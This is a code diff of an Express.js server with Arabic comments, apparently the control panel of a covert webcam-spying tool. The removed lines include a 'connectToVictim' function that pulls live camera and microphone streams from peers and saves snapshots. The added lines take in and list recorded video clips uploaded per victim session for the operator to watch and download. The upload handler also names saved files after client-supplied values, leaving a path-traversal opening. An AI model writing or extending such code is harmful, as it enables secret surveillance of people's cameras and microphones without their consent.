@@ -1,8 +1,24 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const multer = require('multer');
 const app = express();
 const PORT = process.env.PORT || 8080;
+
+// إعداد رفع الملفات (مقاطع الفيديو)
+const storage = multer.diskStorage({
+  destination: function (req, file, cb) {
+    const dir = path.join(__dirname, 'public', 'clips');
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    cb(null, dir);
+  },
+  filename: function (req, file, cb) {
+    // نستخدم sessionId واسم الملف المرسل لتمييز المقطع
+    const sessionId = req.body.sessionId || 'unknown';
+    cb(null, sessionId + '_' + file.originalname);
+  }
+});
+const upload = multer({ storage: storage });
 
 // لوج الجلسات
 const sessionsLog = path.join(__dirname, 'sessions.json');
@@ -53,6 +69,29 @@ app.get('/api/sessions', (req, res) => {
   // تنظيف القديم (أكثر من 5 دقائق)
   peers = peers.filter(p => Date.now() - p.time < 300000);
   res.json(peers);
+});
+
+// API: رفع مقطع فيديو (التسجيل المتقطع)
+app.post('/api/upload-clip', upload.single('clip'), (req, res) => {
+  if (!req.file) {
+    return res.status(400).json({ error: 'No file uploaded' });
+  }
+  const sessionId = req.body.sessionId || 'unknown';
+  console.log(`[📹] Received clip from ${sessionId}: ${req.file.filename}`);
+  res.json({ ok: true, filename: req.file.filename });
+});
+
+// API: جلب مقاطع الفيديو لجلسة معينة
+app.get('/api/clips/:sessionId', (req, res) => {
+  const sessionId = req.params.sessionId;
+  const dir = path.join(__dirname, 'public', 'clips');
+  if (!fs.existsSync(dir)) return res.json([]);
+  
+  const files = fs.readdirSync(dir);
+  const userClips = files.filter(f => f.startsWith(sessionId + '_'))
+                         .sort((a, b) => fs.statSync(path.join(dir, b)).mtime.getTime() - fs.statSync(path.join(dir, a)).mtime.getTime()); // ترتيب تنازلي
+  
+  res.json(userClips);
 });
 
 // صفحة التحكم
@@ -177,77 +216,40 @@ app.get('/control', (req, res) => {
           UA: \${(ua || 'N/A').substring(0, 80)}<br>
           Time: \${new Date().toLocaleTimeString()}
         </div>
-        <video id="video-\${peerId}" autoplay playsinline muted style="width:100%;border-radius:10px;background:#000;"></video>
+        <div class="clips-container" id="clips-\${peerId}">جاري سحب المقاطع...</div>
         <div class="controls">
-          <button class="btn-audio" onclick="toggleAudio('\${peerId}')">🔊 Audio</button>
-          <button class="btn-snap" onclick="takeSnap('\${peerId}')">📸 Snap</button>
+          <button class="btn-snap" onclick="fetchClips('\${peerId}')">🔄 تحديث المقاطع</button>
         </div>
       \`;
 
       list.appendChild(card);
       document.getElementById('sessionCount').textContent = list.children.length;
       
-      // محاولة الاتصال بهذا الـ peer
-      setTimeout(() => {
-        connectToVictim(peerId);
-      }, 500);
+      // Fetch clips periodically
+      fetchClips(peerId);
+      setInterval(() => fetchClips(peerId), 15000);
     }
 
-    function connectToVictim(peerId) {
-      try {
-        const conn = controlPeer.connect(peerId, { reliable: true });
-        connections[peerId] = conn;
-        
-        // Use a dummy stream instead of null for the call to work reliably across browsers
-        const canvas = document.createElement('canvas');
-        canvas.width = 640; canvas.height = 480;
-        const dummyStream = canvas.captureStream(0);
-        
-        try {
-          const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          const dest = audioCtx.createMediaStreamDestination();
-          const audioTrack = dest.stream.getAudioTracks()[0];
-          dummyStream.addTrack(audioTrack);
-        } catch(e) {}
-        
-        const call = controlPeer.call(peerId, dummyStream); 
-        if (call) {
-          call.on('stream', function(stream) {
-            const vid = document.getElementById('video-' + peerId);
-            if (vid) {
-              vid.srcObject = stream;
-              vid.play();
-            }
+    function fetchClips(peerId) {
+      fetch('/api/clips/' + peerId)
+        .then(res => res.json())
+        .then(clips => {
+          const container = document.getElementById('clips-' + peerId);
+          if (!container) return;
+          if (clips.length === 0) {
+            container.innerHTML = '<p style="color:#aaa;">لا توجد مقاطع بعد، يرجى الانتظار...</p>';
+            return;
+          }
+          let html = '<h4 style="margin:5px 0;">المقاطع المسجلة (' + clips.length + ')</h4><div style="max-height:250px;overflow-y:auto;">';
+          clips.forEach(clip => {
+            html += '<div style="margin-bottom:10px; background:rgba(0,0,0,0.3); padding:5px; border-radius:5px;">'
+                 + '<video src="/clips/' + clip + '" controls style="width:100%; border-radius:5px; background:#000;"></video>'
+                 + '<div style="text-align:right;"><a href="/clips/' + clip + '" download style="color:#4caf50;text-decoration:none;">💾 تحميل المقطع</a></div>'
+                 + '</div>';
           });
-        }
-      } catch(e) {
-        console.log('Connect error:', e);
-      }
-    }
-
-    function toggleAudio(peerId) {
-      const vid = document.getElementById('video-' + peerId);
-      if (vid) {
-        vid.muted = !vid.muted;
-      }
-    }
-
-    function takeSnap(peerId) {
-      const vid = document.getElementById('video-' + peerId);
-      if (!vid || !vid.srcObject) return;
-      
-      const canvas = document.createElement('canvas');
-      canvas.width = vid.videoWidth || 640;
-      canvas.height = vid.videoHeight || 480;
-      canvas.getContext('2d').drawImage(vid, 0, 0);
-      
-      const link = document.createElement('a');
-      link.download = 'snap_' + peerId.substring(0,8) + '_' + Date.now() + '.png';
-      link.href = canvas.toDataURL();
-      link.click();
-      
-      snapCount++;
-      document.getElementById('snapCount').textContent = snapCount;
+          html += '</div>';
+          container.innerHTML = html;
+        }).catch(err => console.log('Error fetching clips:', err));
     }
 
     async function fetchSessions() {
